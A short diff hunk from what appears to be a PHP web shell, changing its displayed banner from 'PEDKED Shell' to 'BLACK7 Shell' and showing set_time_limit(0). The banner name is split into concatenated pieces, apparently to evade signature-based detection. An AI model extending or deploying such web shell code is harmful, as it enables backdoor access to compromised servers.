@@ -113,7 +113,7 @@ option {
 </style>
 <center>
 <?php
-echo '<font face="Bungee" size="7">PED'.'K'.'E'.'D Sh'.'el'.'l</font></center>
+echo '<font face="Bungee" size="7">BLA'.'C'.'K'.'7 Sh'.'el'.'l</font></center>
 <table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
 <tr><td>';
 set_time_limit(0);
